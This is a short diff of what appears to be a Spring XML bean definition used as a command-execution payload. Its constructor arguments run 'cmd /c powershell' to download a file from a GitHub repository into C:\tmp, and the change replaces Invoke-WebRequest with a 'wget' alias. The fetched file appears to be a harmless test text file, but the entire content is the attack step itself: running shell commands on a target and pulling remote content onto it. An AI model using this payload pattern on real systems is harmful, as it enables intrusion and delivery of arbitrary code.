@@ -8,7 +8,7 @@
             <list>
                 <value>cmd</value>
                 <value>/c</value>
-                <value>powershell Invoke-WebRequest "https://github.com/Nf4ll/test/blob/main/hola.txt" -OutFile "C:\tmp\hola.txt"</value>
+                <value>powershell -c 'wget https://github.com/Nf4ll/test/blob/main/hola.txt -o C:\tmp\hola.txt'</value>
             </list>
             </constructor-arg>
         </bean>
